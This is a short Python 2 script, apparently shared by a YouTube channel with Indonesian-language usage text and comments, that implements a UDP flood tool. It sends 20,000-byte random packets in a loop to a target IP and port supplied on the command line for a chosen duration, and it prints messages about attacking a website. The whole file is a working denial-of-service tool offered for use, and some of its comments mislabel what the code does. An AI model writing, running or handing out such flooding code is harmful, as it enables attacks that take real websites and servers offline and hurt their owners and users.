import time
import socket
import random
import sys
def usage():
    print "\33[1;33mSubscribe CH RoniYT"
    print "\33[31;1mCara Jalankan Tool"
    print "\33[31;1mKetik : python2 attack.py (ip) (port) (packet)"
    print "\33[31;1mContoh : python2 attack.py 123.45.67.89 80 150"
    print "\33[1;33mLink YT : https://m.youtube.com/channel/UCNHZbNTS69kwCYJ8jcLzUzQ/"
    print "\33[1;33mTerimakasih"
def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\33[1;33mMenyerang Website \33[31;1m%s \33[1;33mBerhasil Masuk \33[31;1m%s \33[1;33mServer Website \33[31;1m%s  "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()


